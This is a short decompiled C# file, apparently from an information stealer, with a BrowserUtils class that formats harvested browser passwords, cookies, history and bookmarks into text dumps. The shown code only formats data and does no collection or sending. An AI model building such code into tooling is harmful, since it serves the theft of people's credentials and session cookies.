﻿using System;

namespace SHARP
{
	// Token: 0x02000018 RID: 24
	internal sealed class BrowserUtils
	{
		// Token: 0x0600008D RID: 141 RVA: 0x000042D7 File Offset: 0x000024D7
		public static string FormatPassword(Password pPassword)
		{
			return string.Format("Hostname: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000042F8 File Offset: 0x000024F8
		private static string FormatCookie(Cookie cCookie)
		{
			return string.Format("{0} TRUE {1} FALSE \n\t{5}    {4}\n\t{2}{3}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue,
				cCookie.sKey
			});
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00004350 File Offset: 0x00002550
		public static string FormatHistory(Site sSite)
		{
			return string.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00004376 File Offset: 0x00002576
		public static string FormatBookmark(Bookmark bBookmark)
		{
			if (!string.IsNullOrEmpty(bBookmark.sUrl))
			{
				return string.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			return string.Format("### {0} ###\n", bBookmark.sTitle);
		}
	}
}
